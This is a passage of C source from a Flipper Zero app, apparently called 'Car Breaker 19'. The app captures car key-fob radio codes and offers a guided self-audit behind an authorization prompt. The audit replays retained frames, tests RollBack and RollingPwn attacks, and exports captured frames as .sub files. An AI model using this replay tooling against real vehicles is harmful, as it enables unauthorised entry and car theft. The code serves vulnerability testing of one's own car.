        written = snprintf(ptr, remaining, "Counter regression!\n");
        ptr += written;
        remaining -= written;
    }

    if(analysis.hitag2_key_exposure_risk && remaining > 0) {
        written = snprintf(
            ptr, remaining, "Key recovery risk (%u frames)\n", (unsigned)analysis.hitag2_uid_frame_count);
        ptr += written;
        remaining -= written;
    }

    dialog_ex_set_text(app->capture_dialog, app->capture_text, 64, 32, AlignCenter, AlignCenter);
}

static void car_breaker_ui_timer_callback(void* context) {
    CarBreakerApp* app = context;
    bool dirty = false;

    furi_mutex_acquire(app->lock, FuriWaitForever);
    dirty = app->capture_dirty;
    app->capture_dirty = false;
    furi_mutex_release(app->lock);

    if(dirty && app->active_view == CarBreakerViewCapture) {
        car_breaker_update_capture_display(app);
    }

    if(app->active_view == CarBreakerViewAudit) {
        if(app->audit_step == CarBreakerAuditStepCapture) {
            uint16_t have = car_breaker_audit_capture_count(app->audit);
            if(app->capturing && have >= app->audit->target_frames) {
                car_breaker_audit_finish_capture(app);
            }
        }
        // Progress counts and the static-test settle countdown both tick
        car_breaker_audit_render(app);
    }
}

static void car_breaker_apply_preset(CarBreakerApp* app, uint8_t preset_idx) {
    if(preset_idx >= CAR_BREAKER_PRESETS_COUNT) {
        return;
    }

    if(subghz_worker_is_running(app->worker)) {
        subghz_worker_stop(app->worker);
        furi_hal_subghz_stop_async_rx();
    }
    furi_hal_subghz_idle();

    const CarBreakerPreset* preset = &car_breaker_presets[preset_idx];
    furi_hal_subghz_load_custom_preset(preset->regs);
    furi_hal_subghz_set_frequency_and_path(preset->frequency);
    furi_hal_subghz_flush_rx();
    furi_hal_subghz_rx();

    furi_hal_subghz_start_async_rx(subghz_worker_rx_callback, app->worker);
    subghz_worker_start(app->worker);

    app->current_preset_index = preset_idx;
    app->capture_dirty = true;
}

static void car_breaker_start_capture(CarBreakerApp* app) {
    if(!app || app->capturing) return;
    if(!app->selection_ready) {
        app->pending_capture = true;
        car_breaker_show_region_menu(app);
        return;
    }

    app->pending_capture = false;

    car_breaker_update_status(app, "Listening...");
    dialog_ex_set_center_button_text(app->capture_dialog, "Stop");

    furi_hal_subghz_reset();
    furi_hal_subghz_idle();

    subghz_worker_set_context(app->worker, app);
    subghz_worker_set_pair_callback(app->worker, car_breaker_worker_pair_callback);
    subghz_worker_set_overrun_callback(app->worker, car_breaker_worker_overrun_callback);

    car_breaker_apply_preset(app, app->current_preset_index);

    app->pulse_count = 0;
    app->capturing = true;
    app->overrun = false;

    if(!app->ui_timer) {
        app->ui_timer =
            furi_timer_alloc(car_breaker_ui_timer_callback, FuriTimerTypePeriodic, app);
    }
    furi_timer_start(app->ui_timer, furi_ms_to_ticks(250));
}

static void car_breaker_stop_capture(CarBreakerApp* app) {
    if(!app->capturing) return;
    app->pending_capture = false;

    if(subghz_worker_is_running(app->worker)) {
        subghz_worker_stop(app->worker);
        furi_hal_subghz_stop_async_rx();
    }
    furi_hal_subghz_idle();

    app->capturing = false;
    // The guided audit keeps the UI timer alive for its progress display
    if(app->ui_timer && app->active_view != CarBreakerViewAudit) {
        furi_timer_stop(app->ui_timer);
    }
    car_breaker_update_status(app, "Capture paused");
    dialog_ex_set_center_button_text(app->capture_dialog, "Back");
}

// ---------------------------------------------------------------------------
// Guided audit: transmit machinery
// ---------------------------------------------------------------------------

typedef struct {
    const int32_t* durations;
    uint16_t count;
    uint16_t index;
} CarBreakerTxFeed;

static LevelDuration car_breaker_audit_tx_yield(void* context) {
    CarBreakerTxFeed* feed = context;
    if(feed->index >= feed->count) {
        return level_duration_reset();
    }
    int32_t signed_duration = feed->durations[feed->index++];
    uint32_t duration =
        (signed_duration < 0) ? (uint32_t)(-signed_duration) : (uint32_t)signed_duration;
    if(duration == 0) duration = 1;
    return level_duration_make(signed_duration >= 0, duration);
}

/** Transmit one retained frame with the preset it was captured with. */
static bool
    car_breaker_audit_transmit_frame(CarBreakerApp* app, const CarBreakerAuditFrame* frame) {
    if(!app || !frame || !frame->valid) return false;
    if(app->capturing) {
        car_breaker_stop_capture(app);
    }

    const CarBreakerPreset* preset = NULL;
    if(frame->preset_index < CAR_BREAKER_PRESETS_COUNT) {
        preset = &car_breaker_presets[frame->preset_index];
    } else {
        preset = &car_breaker_presets[app->current_preset_index];
    }

    furi_hal_subghz_idle();
    furi_hal_subghz_load_custom_preset(preset->regs);
    furi_hal_subghz_set_frequency_and_path(preset->frequency);

    CarBreakerTxFeed feed = {
        .durations = frame->durations,
        .count = frame->count,
        .index = 0,
    };

    bool started = furi_hal_subghz_start_async_tx(car_breaker_audit_tx_yield, &feed);
    if(!started) {
        // TX refused, e.g. regulation-locked firmware
        furi_hal_subghz_idle();
        return false;
    }

    uint32_t started_at = furi_get_tick();
    while(!furi_hal_subghz_is_async_tx_complete()) {
        if(furi_get_tick() - started_at > 3000) {
            break;
        }
        furi_delay_ms(10);
    }

    furi_hal_subghz_stop_async_tx();
    furi_hal_subghz_idle();
    return true;
}

/** Run one audit replay step; a RollBack burst sends its frames back to back. */
static bool car_breaker_audit_run_tx_step(CarBreakerApp* app) {
    CarBreakerAuditState* audit = app->audit;
    bool burst = (audit->test == CarBreakerAuditTestRollBack);
    bool ok = true;

    do {
        const CarBreakerAuditFrame* frame = car_breaker_audit_plan_frame(audit, audit->replay_done);
        if(!frame) break;

        char line[96];
        snprintf(
            line,
            sizeof(line),
            "Replay %u/%u: %s",
            audit->replay_done + 1,
            audit->replay_count,
            car_breaker_audit_test_name(audit->test));
        car_breaker_update_status(app, line);

        ok = car_breaker_audit_transmit_frame(app, frame);
        furi_mutex_acquire(app->lock, FuriWaitForever);
        car_breaker_audit_log(
            audit,
            "Replay %u/%u: tx=%s",
            audit->replay_done + 1,
            audit->replay_count,
            ok ? "ok" : "BLOCKED");
        furi_mutex_release(app->lock);
        audit->replay_done++;

        if(!ok) break;
        if(burst && audit->replay_done < audit->replay_count) {
            furi_delay_ms(CAR_BREAKER_AUDIT_BURST_GAP_MS);
        }
    } while(burst && audit->replay_done < audit->replay_count);

    audit->last_tx_ok = ok;
    return ok;
}

// ---------------------------------------------------------------------------
// Guided audit: flow control
// ---------------------------------------------------------------------------

static void car_breaker_audit_finish_capture(CarBreakerApp* app) {
    car_breaker_stop_capture(app);
    // The retention ring keeps the raw frames for the transmit phase; the
    // analysis session data stays untouched for passive findings.
    app->audit_step =
        (app->audit_test == CarBreakerAuditTestRollingPwn) ? CarBreakerAuditStepPrepare :
                                                              CarBreakerAuditStepTxConfirm;

    CarBreakerAuditState* audit = app->audit;
    furi_mutex_acquire(app->lock, FuriWaitForever);
    car_breaker_audit_log(audit, "Capture done: %u frames", car_breaker_audit_capture_count(audit));
    car_breaker_audit_build_plan(audit);
    car_breaker_audit_log(
        audit, "Plan: %u replay(s), bounded at %u", audit->replay_count, CAR_BREAKER_AUDIT_MAX_REPLAYS);
    furi_mutex_release(app->lock);
}

static void car_breaker_audit_set_verdict(CarBreakerApp* app, CarBreakerAuditVerdict verdict) {
    CarBreakerAuditState* audit = app->audit;
    audit->verdict = verdict;
    app->audit_step = CarBreakerAuditStepVerdict;

    furi_mutex_acquire(app->lock, FuriWaitForever);
    car_breaker_audit_log(audit, "VERDICT: %s", car_breaker_audit_verdict_name(verdict));
    if(verdict == CarBreakerAuditVerdictVulnerable) {
        car_breaker_audit_log(
            audit, "Car reacted to replayed code(s): %s mechanism confirmed.", car_breaker_audit_test_name(audit->test));
    } else if(verdict == CarBreakerAuditVerdictNotDetected) {
        car_breaker_audit_log(
            audit, "No reaction within the tested scope; not proof of safety.");
    }
    uint32_t epoch = furi_hal_rtc_get_timestamp();
    bool saved = car_breaker_audit_export_log(audit, epoch);
    car_breaker_audit_log(
        audit, "Log %s: " CAR_BREAKER_AUDIT_DIR "/%s%lu.txt", saved ? "saved" : "export FAILED", CAR_BREAKER_AUDIT_LOG_PREFIX, epoch);
    furi_mutex_release(app->lock);

    // Verdict is terminal: no more live data to refresh
    if(app->ui_timer) {
        furi_timer_stop(app->ui_timer);
    }

    if(verdict == CarBreakerAuditVerdictVulnerable) {
        notification_message(app->notifications, &sequence_error);
    }
}

static const char* car_breaker_audit_step_title(CarBreakerApp* app) {
    switch(app->audit_step) {
    case CarBreakerAuditStepAuth:
        return "Authorization";
    case CarBreakerAuditStepBrief:
        return car_breaker_audit_test_name(app->audit_test);
    case CarBreakerAuditStepCapture:
        return "Audit: Capture";
    case CarBreakerAuditStepPrepare:
        return "Audit: Prepare";
    case CarBreakerAuditStepTxConfirm:
        return "Audit: TX";
    case CarBreakerAuditStepTxRunning:
        return "Audit: Sending";
    case CarBreakerAuditStepObserve:
        return "Audit: Observe";
    case CarBreakerAuditStepVerdict:
        return "Audit Result";
    default:
        return "Guided Audit";
    }
}

static void car_breaker_audit_render(CarBreakerApp* app) {
    CarBreakerAuditState* audit = app->audit;
    const char* header = car_breaker_audit_step_title(app);
    char* text = app->audit_text;
    size_t remaining = sizeof(app->audit_text);

    dialog_ex_set_header(app->audit_dialog, header, 64, 2, AlignCenter, AlignTop);
    dialog_ex_set_left_button_text(app->audit_dialog, NULL);
    dialog_ex_set_right_button_text(app->audit_dialog, NULL);
    dialog_ex_set_center_button_text(app->audit_dialog, "OK");

    switch(app->audit_step) {
    case CarBreakerAuditStepAuth:
        snprintf(
            text,
            remaining,
            "I confirm this vehicle is\n"
            "mine or I am authorized\n"
            "to test it. Only signals\n"
            "captured in this session\n"
            "will be transmitted.");
        dialog_ex_set_center_button_text(app->audit_dialog, "I Agree");
        break;

    case CarBreakerAuditStepBrief: {
        const char* brief = car_breaker_audit_test_brief(app->audit_test);
        uint16_t have = car_breaker_audit_capture_count(audit);
        snprintf(text, remaining, "%s\nCaptured so far: %u", brief, have);
        dialog_ex_set_center_button_text(app->audit_dialog, "Start Capture");
        break;
    }

    case CarBreakerAuditStepCapture: {
        uint16_t have = car_breaker_audit_capture_count(audit);
        uint16_t target = audit->target_frames;
        snprintf(
            text,
            remaining,
            "%s\n\nFrames: %u/%u\n%s",
            car_breaker_audit_test_brief(app->audit_test),
            have,
            target,
            have >= audit->min_frames ? "OK to finish early" : "Keep pressing the fob");
        dialog_ex_set_center_button_text(
            app->audit_dialog, have >= audit->min_frames ? "Finish" : "...");
        break;
    }

    case CarBreakerAuditStepPrepare:
        snprintf(
            text,
            remaining,
            "Codes captured out of car\n"
            "range are now unused.\n"
            "Walk back to the vehicle,\n"
            "then start transmitting.");
        dialog_ex_set_center_button_text(app->audit_dialog, "Transmit");
        break;

    case CarBreakerAuditStepTxConfirm: {
        const CarBreakerAuditFrame* frame = car_breaker_audit_plan_frame(audit, 0);
        uint32_t frequency = frame ? car_breaker_presets[frame->preset_index].frequency : 0;
        uint32_t elapsed_s =
            (furi_get_tick() - (audit->last_capture_ms ? audit->last_capture_ms : furi_get_tick())) /
            furi_ms_to_ticks(1000);

        if(app->audit_test == CarBreakerAuditTestStaticCode &&
           elapsed_s < CAR_BREAKER_AUDIT_STATIC_SETTLE_S) {
            snprintf(
                text,
                remaining,
                "Settle delay: wait %lus\n"
                "before replaying the\n"
                "used code (fresh rolling\n"
                "codes would mask the\n"
                "result).",
                (unsigned long)(CAR_BREAKER_AUDIT_STATIC_SETTLE_S - elapsed_s));
            dialog_ex_set_center_button_text(app->audit_dialog, NULL);
        } else {
            snprintf(
                text,
                remaining,
                "Ready to transmit\n"
                "%u frame(s) at\n"
                "%lu.%02lu MHz.\n"
                "Keep the fob away!",
                audit->replay_count,
                frequency / 1000000,
                (frequency / 10000) % 100);
            dialog_ex_set_center_button_text(app->audit_dialog, "Transmit");
        }
        break;
    }

    case CarBreakerAuditStepTxRunning:
        snprintf(
            text,
            remaining,
            "Transmitting replay %u/%u...",
            audit->replay_done + (audit->last_tx_ok ? 0 : 1),
            audit->replay_count);
        dialog_ex_set_center_button_text(app->audit_dialog, NULL);
        break;

    case CarBreakerAuditStepObserve:
        snprintf(
            text,
            remaining,
            "Watch the car:\n"
            "did it unlock, lock or\n"
            "flash the indicators\n"
            "after the replay?");
        dialog_ex_set_left_button_text(app->audit_dialog, "No");
        dialog_ex_set_right_button_text(app->audit_dialog, "Yes");
        dialog_ex_set_center_button_text(app->audit_dialog, NULL);
        break;

    case CarBreakerAuditStepVerdict:
        switch(audit->verdict) {
        case CarBreakerAuditVerdictVulnerable:
            snprintf(
                text,
                remaining,
                "VULNERABLE\n"
                "The car accepted a\n"
                "replayed code (%s).\n"
                "%s",
                car_breaker_audit_test_name(audit->test),
                audit->log_exported ? "Log saved to\n" CAR_BREAKER_AUDIT_DIR : "Log export failed");
            break;
        case CarBreakerAuditVerdictNotDetected:
            snprintf(
                text,
                remaining,
                "NOT DETECTED\n"
                "No reaction within the\n"
                "tested scope. Not a\n"
                "proof of safety.\n%s",
                audit->log_exported ? "Log saved." : "Log export failed");
            break;
        case CarBreakerAuditVerdictInconclusive:
            snprintf(
                text,
                remaining,
                "INCONCLUSIVE\n"
                "No reaction within the\n"
                "bounded replay count.\n%s",
                audit->log_exported ? "Log saved." : "Log export failed");
            break;
        case CarBreakerAuditVerdictAborted:
            snprintf(text, remaining, "ABORTED\nNo signals were sent.");
            break;
        default:
            snprintf(text, remaining, "PENDING");
            break;
        }
        dialog_ex_set_center_button_text(app->audit_dialog, "Back");
        break;
    }

    dialog_ex_set_text(app->audit_dialog, text, 64, 24, AlignCenter, AlignTop);
}

static void car_breaker_audit_next_replay_or_finish(CarBreakerApp* app) {
    CarBreakerAuditState* audit = app->audit;

    if(app->audit_test != CarBreakerAuditTestRollingPwn ||
       audit->replay_done >= audit->replay_count) {
        // Static and RollBack ask once after their (single or burst) send;
        // RollingPwn asks after every code until one is accepted
        car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictNotDetected);
        return;
    }

    // RollingPwn: more unused codes remain
    app->audit_step = CarBreakerAuditStepTxConfirm;
}

static void car_breaker_audit_dialog_callback(DialogExResult result, void* context) {
    CarBreakerApp* app = context;
    CarBreakerAuditState* audit = app->audit;

    if(!car_breaker_is_key_debounced(app)) return;

    switch(app->audit_step) {
    case CarBreakerAuditStepAuth:
        if(result == DialogExResultCenter) {
            app->audit_step = CarBreakerAuditStepBrief;
        } else if(result == DialogExResultLeft || result == DialogExResultRight) {
            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
        }
        break;

    case CarBreakerAuditStepBrief:
        if(result == DialogExResultCenter) {
            app->audit_step = CarBreakerAuditStepCapture;
            car_breaker_start_capture(app);
        } else if(result == DialogExResultLeft) {
            car_breaker_safe_switch_view(app, CarBreakerViewAuditSelect);
            return;
        }
        break;

    case CarBreakerAuditStepCapture:
        if(result == DialogExResultCenter &&
           car_breaker_audit_capture_count(audit) >= audit->min_frames) {
            car_breaker_audit_finish_capture(app);
        } else if(result == DialogExResultLeft) {
            car_breaker_stop_capture(app);
            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
        }
        break;

    case CarBreakerAuditStepPrepare:
        if(result == DialogExResultCenter) {
            app->audit_step = CarBreakerAuditStepTxConfirm;
        } else if(result == DialogExResultLeft) {
            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
        }
        break;

    case CarBreakerAuditStepTxConfirm:
        if(result == DialogExResultCenter) {
            app->audit_step = CarBreakerAuditStepTxRunning;
            car_breaker_audit_render(app);
            car_breaker_audit_run_tx_step(app);
            if(!audit->last_tx_ok) {
                car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictInconclusive);
                notification_message(app->notifications, &sequence_error);
            } else {
                app->audit_step = CarBreakerAuditStepObserve;
            }
        } else if(result == DialogExResultLeft) {
            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
        }
        break;

    case CarBreakerAuditStepTxRunning:
        break;

    case CarBreakerAuditStepObserve:
        if(result == DialogExResultRight) {
            notification_message(app->notifications, &sequence_success);
            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictVulnerable);
        } else if(result == DialogExResultLeft) {
            car_breaker_audit_next_replay_or_finish(app);
        }
        break;

    case CarBreakerAuditStepVerdict:
        if(result == DialogExResultCenter || result == DialogExResultLeft) {
            car_breaker_safe_switch_view(app, CarBreakerViewMenu);
            return;
        }
        break;
    }

    if(app->active_view == CarBreakerViewAudit) {
        car_breaker_audit_render(app);
    }
}

static uint32_t car_breaker_audit_previous_callback(void* context) {
    CarBreakerApp* app = context;
    if(app->audit_step == CarBreakerAuditStepCapture) {
        car_breaker_stop_capture(app);
    }
    if(app->audit_step != CarBreakerAuditStepAuth && app->audit_step != CarBreakerAuditStepVerdict) {
        car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
    }
    return CarBreakerViewMenu;
}

static void car_breaker_audit_menu_callback(void* context, uint32_t index) {
    CarBreakerApp* app = context;
    if(index >= CarBreakerAuditTestCount) return;
    if(!car_breaker_is_key_debounced(app)) return;

    app->audit_test = (CarBreakerAuditTest)index;
    car_breaker_audit_begin(app->audit, app->audit_test);

    uint32_t epoch = furi_hal_rtc_get_timestamp();
    furi_mutex_acquire(app->lock, FuriWaitForever);
    car_breaker_audit_log(app->audit, "Car Breaker 19 Guided Audit");
    car_breaker_audit_log(app->audit, "Test: %s", car_breaker_audit_test_name(app->audit_test));
    car_breaker_audit_log(app->audit, "Started: %lu", epoch);
    car_breaker_audit_log(
        app->audit,
        "Region: %s, Profile: %s",
        car_breaker_region_names[app->selected_region],
        car_breaker_profile_names[app->selected_profile]);
    furi_mutex_release(app->lock);

    app->audit_step = CarBreakerAuditStepAuth;
    car_breaker_audit_render(app);
    car_breaker_safe_switch_view(app, CarBreakerViewAudit);
}

static uint32_t car_breaker_audit_select_previous_callback(void* context) {
    CarBreakerApp* app = context;
    // Leaving test selection without choosing aborts nothing yet
    UNUSED(app);
    return CarBreakerViewMenu;
}

static void car_breaker_known_menu_callback(void* context, uint32_t index) {
    CarBreakerApp* app = context;
    if(!car_breaker_is_key_debounced(app)) return;

    const CarBreakerKnownIssue* issue = car_breaker_audit_known_issue(index);
    if(!issue) return;

    dialog_ex_set_header(app->known_dialog, issue->brand, 64, 2, AlignCenter, AlignTop);
    char text[192];
    snprintf(text, sizeof(text), "%s\n\n%s\n\nSource: arXiv 2505.02713", issue->issue, issue->detail);
    dialog_ex_set_text(app->known_dialog, text, 64, 20, AlignCenter, AlignTop);
    dialog_ex_set_center_button_text(app->known_dialog, "Back");
    dialog_ex_set_left_button_text(app->known_dialog, NULL);
    dialog_ex_set_right_button_text(app->known_dialog, NULL);
    car_breaker_safe_switch_view(app, CarBreakerViewKnownDetail);
}

static uint32_t car_breaker_known_list_previous_callback(void* context) {
    CarBreakerApp* app = context;
    UNUSED(app);
    return CarBreakerViewMenu;
}

static uint32_t car_breaker_known_detail_previous_callback(void* context) {
    CarBreakerApp* app = context;
    UNUSED(app);
    return CarBreakerViewKnown;
}

static void car_breaker_known_dialog_callback(DialogExResult result, void* context) {
    CarBreakerApp* app = context;
    if(!car_breaker_is_key_debounced(app)) return;
    if(result == DialogExResultCenter) {
        car_breaker_safe_switch_view(app, CarBreakerViewKnown);
    }
}

/** Write every retained frame as a stock-compatible .sub file. */
static void car_breaker_export_session(CarBreakerApp* app) {
    uint16_t total = car_breaker_audit_retained_total(NULL);
    uint32_t epoch = furi_hal_rtc_get_timestamp();
    uint16_t exported = 0;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, CAR_BREAKER_AUDIT_DIR);
    furi_record_close(RECORD_STORAGE);

    for(uint16_t k = 0; k < total; k++) {
        const CarBreakerAuditFrame* frame = car_breaker_audit_retained_frame(k);
        if(!frame) continue;

        const CarBreakerPreset* preset = &car_breaker_presets[frame->preset_index];
        char path[96];
        snprintf(path, sizeof(path), "%s/frame_%u_%lu.sub", CAR_BREAKER_AUDIT_DIR, k, epoch);
        if(car_breaker_audit_export_sub(frame, preset->frequency, preset->regs, preset->regs_size, path)) {
            exported++;
        }
    }

    char text[160];
    snprintf(
        text,
        sizeof(text),
        "%u of %u frame(s)\nwritten to\n" CAR_BREAKER_AUDIT_DIR,
        exported,
        total);
    dialog_ex_set_header(app->known_dialog, "Export Session", 64, 2, AlignCenter, AlignTop);
    dialog_ex_set_text(app->known_dialog, text, 64, 24, AlignCenter, AlignTop);
    dialog_ex_set_center_button_text(app->known_dialog, "Back");
    dialog_ex_set_left_button_text(app->known_dialog, NULL);
    dialog_ex_set_right_button_text(app->known_dialog, NULL);
    car_breaker_safe_switch_view(app, CarBreakerViewKnown);
}


static void car_breaker_capture_callback(DialogExResult result, void* context) {
    CarBreakerApp* app = context;
    if(result == DialogExResultCenter) {
        // Stop button pressed
        car_breaker_stop_capture(app);
        // Reset session for next scan
        furi_mutex_acquire(app->lock, FuriWaitForever);
        car_breaker_reset_session_locked(app);
        furi_mutex_release(app->lock);
        car_breaker_safe_switch_view(app, CarBreakerViewMenu);
    }
}

static uint32_t car_breaker_capture_back_callback(void* context) {
    CarBreakerApp* app = context;
    car_breaker_stop_capture(app);
    // Reset session for next scan
    furi_mutex_acquire(app->lock, FuriWaitForever);
    car_breaker_reset_session_locked(app);
    furi_mutex_release(app->lock);
    return CarBreakerViewMenu;
}


static uint32_t car_breaker_splash_previous_callback(void* context) {
    UNUSED(context);
    return CarBreakerViewSplash;
}

static uint32_t car_breaker_menu_previous_callback(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static uint32_t car_breaker_view_previous_callback(void* context) {
    UNUSED(context);
    return CarBreakerViewMenu;
}

static void car_breaker_splash_callback(DialogExResult result, void* context) {
    CarBreakerApp* app = context;
    UNUSED(result);
    car_breaker_safe_switch_view(app, CarBreakerViewMenu);
}

static void car_breaker_submenu_callback(void* context, uint32_t index) {
    CarBreakerApp* app = context;

    if(!car_breaker_is_key_debounced(app)) return;

    switch(index) {
    case CarBreakerMenuStart:
        app->pending_capture = true;
        car_breaker_show_region_menu(app);
        break;
    case CarBreakerMenuGuidedAudit:
        car_breaker_safe_switch_view(app, CarBreakerViewAuditSelect);
        break;
    case CarBreakerMenuKnownIssues:
        car_breaker_safe_switch_view(app, CarBreakerViewKnown);
        break;
    case CarBreakerMenuExportSession:
        car_breaker_export_session(app);
        break;
    case CarBreakerMenuAbout:
        car_breaker_safe_switch_view(app, CarBreakerViewAbout);
        break;
    default:
        break;
    }
}

static CarBreakerApp* car_breaker_alloc(void) {
    CarBreakerApp* app = malloc(sizeof(CarBreakerApp));
    memset(app, 0, sizeof(CarBreakerApp));

    app->lock = furi_mutex_alloc(FuriMutexTypeNormal);
    app->worker = subghz_worker_alloc();
    app->audit = car_breaker_audit_alloc();
    app->audit_step = CarBreakerAuditStepAuth;
    app->audit_test = CarBreakerAuditTestStaticCode;
    snprintf(app->status_message, sizeof(app->status_message), "Ready");
    app->selected_region = CarBreakerRegionUSA;
    app->selected_profile = CarBreakerProfileHondaModern;
    app->current_preset_index =
        car_breaker_select_preset_index(app->selected_region, app->selected_profile);
    app->selection_ready = true;
    app->pending_capture = false;

    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    // Splash dialog
    app->splash_dialog = dialog_ex_alloc();
    dialog_ex_set_header(app->splash_dialog, "Car Breaker 19", 64, 3, AlignCenter, AlignTop);
    dialog_ex_set_text(
        app->splash_dialog,
        "Passive RKE analysis +\nguided self-audit tests\n(own/authorized vehicles\nonly).",
        64,
        32,
        AlignCenter,
        AlignCenter);
    dialog_ex_set_center_button_text(app->splash_dialog, "Continue");
    dialog_ex_set_context(app->splash_dialog, app);
    dialog_ex_set_result_callback(app->splash_dialog, car_breaker_splash_callback);
    view_set_previous_callback(dialog_ex_get_view(app->splash_dialog), car_breaker_splash_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewSplash, dialog_ex_get_view(app->splash_dialog));

    app->submenu = submenu_alloc();
    submenu_set_header(app->submenu, "Car Breaker 19");
    submenu_add_item(
        app->submenu, "Start Capture", CarBreakerMenuStart, car_breaker_submenu_callback, app);
    submenu_add_item(
        app->submenu, "Guided Audit (TX)", CarBreakerMenuGuidedAudit, car_breaker_submenu_callback, app);
    submenu_add_item(
        app->submenu, "Known Issues", CarBreakerMenuKnownIssues, car_breaker_submenu_callback, app);
    submenu_add_item(
        app->submenu, "Export Session", CarBreakerMenuExportSession, car_breaker_submenu_callback, app);
    submenu_add_item(
        app->submenu, "About", CarBreakerMenuAbout, car_breaker_submenu_callback, app);
    view_set_previous_callback(submenu_get_view(app->submenu), car_breaker_menu_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewMenu, submenu_get_view(app->submenu));

    app->region_menu = submenu_alloc();
    submenu_set_header(app->region_menu, "Region / Band");
    for(uint32_t i = 0; i < COUNT_OF(car_breaker_region_names); i++) {
        submenu_add_item(
            app->region_menu,
            car_breaker_region_names[i],
            i,
            car_breaker_region_menu_callback,
            app);
    }
    view_set_previous_callback(
        submenu_get_view(app->region_menu), car_breaker_region_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewRegionSelect, submenu_get_view(app->region_menu));

    app->profile_menu = submenu_alloc();
    submenu_set_header(app->profile_menu, "Manufacturer Profile");
    for(uint32_t i = 0; i < COUNT_OF(car_breaker_profile_names); i++) {
        submenu_add_item(
            app->profile_menu,
            car_breaker_profile_names[i],
            i,
            car_breaker_profile_menu_callback,
            app);
    }
    view_set_previous_callback(
        submenu_get_view(app->profile_menu), car_breaker_profile_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewProfileSelect, submenu_get_view(app->profile_menu));

    // Capture dialog
    app->capture_dialog = dialog_ex_alloc();
    dialog_ex_set_header(app->capture_dialog, "Scanning...", 64, 10, AlignCenter, AlignTop);
    dialog_ex_set_text(app->capture_dialog, "Waiting for signal...", 64, 32, AlignCenter, AlignCenter);
    dialog_ex_set_center_button_text(app->capture_dialog, "Stop");
    dialog_ex_set_context(app->capture_dialog, app);
    dialog_ex_set_result_callback(app->capture_dialog, car_breaker_capture_callback);
    view_set_previous_callback(dialog_ex_get_view(app->capture_dialog), car_breaker_capture_back_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewCapture, dialog_ex_get_view(app->capture_dialog));

    // Guided audit test selection
    app->audit_menu = submenu_alloc();
    submenu_set_header(app->audit_menu, "Guided Audit");
    for(uint32_t i = 0; i < CarBreakerAuditTestCount; i++) {
        submenu_add_item(
            app->audit_menu,
            car_breaker_audit_test_name((CarBreakerAuditTest)i),
            i,
            car_breaker_audit_menu_callback,
            app);
    }
    view_set_previous_callback(submenu_get_view(app->audit_menu), car_breaker_audit_select_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewAuditSelect, submenu_get_view(app->audit_menu));

    // Guided audit flow dialog
    app->audit_dialog = dialog_ex_alloc();
    dialog_ex_set_context(app->audit_dialog, app);
    dialog_ex_set_result_callback(app->audit_dialog, car_breaker_audit_dialog_callback);
    view_set_previous_callback(dialog_ex_get_view(app->audit_dialog), car_breaker_audit_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewAudit, dialog_ex_get_view(app->audit_dialog));

    // Known issues list and detail
    app->known_menu = submenu_alloc();
    submenu_set_header(app->known_menu, "Documented RKE Issues");
    for(uint8_t i = 0; i < car_breaker_audit_known_issue_count(); i++) {
        const CarBreakerKnownIssue* issue = car_breaker_audit_known_issue(i);
        submenu_add_item(app->known_menu, issue->brand, i, car_breaker_known_menu_callback, app);
    }
    view_set_previous_callback(submenu_get_view(app->known_menu), car_breaker_known_list_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewKnown, submenu_get_view(app->known_menu));

    app->known_dialog = dialog_ex_alloc();
    dialog_ex_set_context(app->known_dialog, app);
    dialog_ex_set_result_callback(app->known_dialog, car_breaker_known_dialog_callback);
    view_set_previous_callback(dialog_ex_get_view(app->known_dialog), car_breaker_known_detail_previous_callback);
    view_dispatcher_add_view(
        app->view_dispatcher, CarBreakerViewKnownDetail, dialog_ex_get_view(app->known_dialog));

    app->about_view = car_breaker19_scene_about_alloc();
    view_set_previous_callback(app->about_view, car_breaker_view_previous_callback);
    view_dispatcher_add_view(app->view_dispatcher, CarBreakerViewAbout, app->about_view);

    return app;
}

static void car_breaker_free(CarBreakerApp* app) {
    if(!app) return;

    car_breaker_stop_capture(app);

    if(app->ui_timer) {
        furi_timer_stop(app->ui_timer);
        furi_timer_free(app->ui_timer);
    }

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewKnownDetail);
    dialog_ex_free(app->known_dialog);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewKnown);
    submenu_free(app->known_menu);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAudit);
    dialog_ex_free(app->audit_dialog);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAuditSelect);
    submenu_free(app->audit_menu);

    car_breaker_audit_free(app->audit);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAbout);
    car_breaker19_scene_about_free(app->about_view);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewCapture);
    dialog_ex_free(app->capture_dialog);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewProfileSelect);
    submenu_free(app->profile_menu);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewRegionSelect);
    submenu_free(app->region_menu);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewMenu);
    submenu_free(app->submenu);

    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewSplash);
    dialog_ex_free(app->splash_dialog);

